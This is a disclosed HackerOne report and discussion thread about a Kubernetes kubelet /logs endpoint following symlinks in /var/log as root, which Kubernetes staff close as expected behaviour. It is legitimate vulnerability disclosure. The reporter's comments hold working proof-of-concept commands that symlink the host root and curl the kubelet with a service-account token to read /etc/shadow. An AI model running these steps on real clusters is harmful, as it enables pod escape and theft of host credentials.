{"id":1036886,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDM2ODg2","url":"https://hackerone.com/reports/1036886","title":"Kubelet follows symlinks as root in /var/log from the /logs server endpoint ","state":"Closed","substate":"informative","severity_rating":"medium","readable_substate":"Informative","created_at":"2020-11-17T16:54:29.472Z","submitted_at":"2020-11-17T16:54:29.509Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"danielsagi","url":"/danielsagi","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":39386,"url":"https://hackerone.com/kubernetes","handle":"kubernetes","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Kubernetes","twitter_handle":"kubernetesio","website":"https://kubernetes.io/","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-04-01T18:13:00.639Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-12-16T19:42:05.276Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nPrivilege escalation from a  pod, to root read permissions on the entire filesytem of the node, by creating symlinks inside /var/log.\nThe kubelet is simply serving a fileserver at /var/log:\n\n_kubernetes\\pkg\\kubelet\\kubelet.go:1371_\n```golang\nif kl.logServer == nil {\n\t\tkl.logServer = http.StripPrefix(\"/logs/\", http.FileServer(http.Dir(\"/var/log/\")))\n\t}\n```\nThe kubelet naturally runs as root on the node, so this basically gives the ability for pods with write permissions to /var/log directory a directory traversal as a root user on the host (potentially taking over the whole cluster by getting secret keys)\nAn easy fix is checking the symlink destination, to figure out whether it is inside /var/lib/docker or other whitelisted paths to not break to mechanism of logs correlations\n\nA while back, I discovered this bug, when you didn't had the Bug Bounty program. \nI Published the following blog:\nhttps://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts\nDescribing the vulnerability.\n\n(it  requires RBAC permissions to read logs, or a kubelet configured with AlwaysAllow. and a mount point to any child directory inside /var/log)\nI researched some log collectors projects in github, seems like alot of them are freely using this mount point.\nAs a user I would not imagine those projects can potentially take clusters. \n\n## Kubernetes Version:\nAll versions\n\n## Component Version:\nThe kubelet\n\n## Steps To Reproduce:\n  1. create a pod with a mount path to `/var/log`\n  1. create a symlink in the mount point: `/var/log/rootfs_symlink -\u003e /`\n  1. curl from within the pod: `https://\u003cip_of_node\u003e:10250/logs/rootfs_symlink/etc/shadow`\n\n## Supporting Material/References:\nhttps://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts\nhttps://github.com/danielsagi/kube-pod-escape\n\n## Impact\n\nRoot read permissions on the entire filesystem of the node","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":1,"voters":["khizer47"],"severity":{"rating":"medium","score":4.0,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":32489,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/kubernetes/kubelet","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9853103,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @danielsagi and thanks for your report,\n\nCan you please share all the commands from the installation of the Kubernetes cluster to the final exploit in your step by step list? \n\nThanks,\n@turtle_shell","automated_response":false,"created_at":"2020-11-18T09:04:12.264Z","updated_at":"2020-11-18T09:04:12.264Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9854484,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @turtle_shell \nOf course, In this deployment I'm just scheduling on the master, but obviously this is just for simplifications. this affects the kubelet. \n\n```bash\nsudo kubeadm init --pod-network-cidr=10.244.0.0/16\n\nkubectl apply -f https://github.com/coreos/flannel/raw/master/Documentation/kube-flannel.yml\n\nkubectl taint node no20668-vm0 node-role.kubernetes.io/master:NoSchedule-\n\nkubectl apply -f https://raw.githubusercontent.com/danielsagi/kube-pod-escape/master/escaper.yml\n\nkubectl exec -it escaper bash\n\n### Inside the pod:\n$ ln -s / /var/log/host/root_link\n\n$ # ls / (on host)\n$ curl https://$(/sbin/ip route | awk '/default/ { print $3 }'):10250/logs/root_link/ -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"\n\n$ # cat /etc/shadow (on host)\n$ curl https://$(/sbin/ip route | awk '/default/ { print $3 }'):10250/logs/root_link/etc/shadow -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"\n\n\n```","automated_response":false,"created_at":"2020-11-18T11:37:04.508Z","updated_at":"2020-11-18T11:37:04.508Z","actor":{"username":"danielsagi","cleared":false,"url":"/danielsagi","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9896710,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"#","automated_response":false,"created_at":"2020-11-23T10:32:03.388Z","updated_at":"2020-11-23T10:41:58.834Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9896814,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @danielsagi and thanks for your report,\n\nI was able to reproduce, but I just realized that I could do the symlink as an administrator of the pod. Can you please describe how an attacker can exploit this issue?\n\nBest regards,\n@turtle_shell","automated_response":false,"created_at":"2020-11-23T10:42:01.792Z","updated_at":"2020-11-23T10:42:01.792Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9896992,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi,\nYes, what do you mean by administrator of the pod? \nYou create the symlink as root inside of the pod yes, but it is being followed as root on the host, this is essentially a pod escape to the node as root.\n\nAn attacker that compromises a pod with this mount can escape to the host. \nAnd for example read service account tokens of kube-system. In worst cases, private keys.","automated_response":false,"created_at":"2020-11-23T10:59:33.078Z","updated_at":"2020-11-23T10:59:33.078Z","actor":{"username":"danielsagi","cleared":false,"url":"/danielsagi","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9897254,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @danielsagi,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@turtle_shell","automated_response":false,"created_at":"2020-11-23T11:36:43.846Z","updated_at":"2020-11-23T11:36:43.846Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9897293,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2020-11-23T11:41:43.726Z","updated_at":"2020-11-23T11:41:43.726Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (4.0)","old_severity_id":908537,"new_severity_id":913243},"actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9955854,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, is there any progress with this? @turtle_shell \n","automated_response":false,"created_at":"2020-11-29T15:11:34.950Z","updated_at":"2020-11-29T15:11:34.950Z","actor":{"username":"danielsagi","cleared":false,"url":"/danielsagi","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9958594,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello  @danielsagi,\n\nThanks for your patience! The Kubernetes team is still working on this internally, and you will be updated once there is more information to share.\n\nRegards,\n@turtle_shell","automated_response":false,"created_at":"2020-11-30T08:11:01.921Z","updated_at":"2020-11-30T08:11:01.921Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9968298,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is a known and expected behavior. The kubelet trusts the contents of /var/log not to be malicious as that location is controlled by the system administrator. In general,  hostPath volumes are known to be a feature with security implications, and they should only be used by trusted workloads. A system which allows users to run pods with hostPath volumes to arbitrary host locations and allowing writes has problems much more severe than this. For example, why not use a hostPath to the host's /etc directory and directly edit files there?\n\nCluster admins should use security policies and access controls to prevent untrusted users and workloads from mounting host paths. Where host paths can't be avoided, they should mount the path read-only if possible. Read/write paths have the potential to exploit issues like the one you found or related TOCTOU symlink races.\n  \nhttps://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/#controlling-what-privileges-containers-run-with\n\n/var/log is a location where only a privileged process should be able to write. We consider a system which allows an untrusted process to create symbolic links in /var/log to be improperly configured.\n\nFinally, Kubernetes already provides a means of disabling the kubelet's logs endpoint which was added for reasons similar to this. See:\nhttps://github.com/kubernetes/kubernetes/pull/87273 ","automated_response":false,"created_at":"2020-12-01T01:08:58.132Z","updated_at":"2020-12-01T01:08:58.132Z","actor":{"username":"jk1joel","cleared":false,"url":"/jk1joel","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9989894,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jk1joel , I understand what you are saying about this being doable only in misconfigured environments. \nWe also talked about it in the past.\nCan you please explain, why this dependency on \na  \"misconfigured\" environment is any different from, for example: cve-2020-8559. Which actually relies on a node which an attacker has taken control of. \n\nYou can classify this as a post exploitation vulnerability. But this is a vulnerability. \nCalling this a \"documented\" misconfiguration is misleading and avoiding. If you classify a report for an attack surface which requires **root on a node in the cluster** as a vulnerability like said cve, you should classify this as well.\n\nIn addition,\n/Var/log is not like mounting /etc.\nThis is a logging directory. \nI remind you that an app could also mount any innocent subdirectory in that and it would still work. \n\nYou are taking about a scenario when an attacker creates the pod. (Of course if you can create pods and mount folders you can mount whatever) \nThe problem here is with normal applications running with this mount. If you want you can take a look at github and see numerous projects which does that. (I assure you that no one thinks that deploying such app is a security issue)\nIn such case when this app is deployed, an attacker could exploit those apps and take over the cluster.\n\nI do not see anything different in this flow than other reports that relies on an attacker with root access to nodes, even so, this report is far more reasonable.\n\nSide note:\nAdding an optional flag to disable a vulnerable endpoint does not make the vulnerable code go away.","automated_response":false,"created_at":"2020-12-03T00:29:09.408Z","updated_at":"2020-12-03T00:29:09.408Z","actor":{"username":"danielsagi","cleared":false,"url":"/danielsagi","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10125427,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Can you please explain, why this dependency on a \"misconfigured\" environment is any different from, for example: cve-2020-8559. Which actually relies on a node which an attacker has taken control of.\n\nCVE-2020-8559 is a privilege escalation from node to cluster, which is a change in scope. We consider HostPath volumes (especially **writeable** hostpath volumes) to be a *privileged* permission for pods, so you're already granting access to the node. In other words, we don't consider compromising a node from a privileged pod to be an escalation of privilege. If this was an escalation from an unprivileged pod, it would be a different story. See https://kubernetes.io/docs/concepts/security/pod-security-standards/ for what permissions we consider privileged.\n\nI do agree our documentation around this issue could definitely be improved, and I'd encourage you to engage with our new SIG-Security Docs project:\n- Slack: https://kubernetes.slack.com/archives/C01D8R7ACQ2\n- Community meeting: https://docs.google.com/document/d/11LZn7qWB0OzbpF8va_YYGQE4fuRARCGY9KL87hwBLBI/edit#\n- Or follow up on https://github.com/kubernetes/website/issues/18850","automated_response":false,"created_at":"2020-12-16T19:41:10.500Z","updated_at":"2020-12-16T19:41:10.500Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10125428,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"(see previous comment)","automated_response":false,"created_at":"2020-12-16T19:41:55.186Z","updated_at":"2020-12-16T19:41:55.186Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10125429,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-12-16T19:42:05.300Z","updated_at":"2020-12-16T19:42:05.300Z","first_to_agree":true,"actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11215010,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2021-04-01T18:13:00.519Z","updated_at":"2021-04-01T18:13:00.519Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}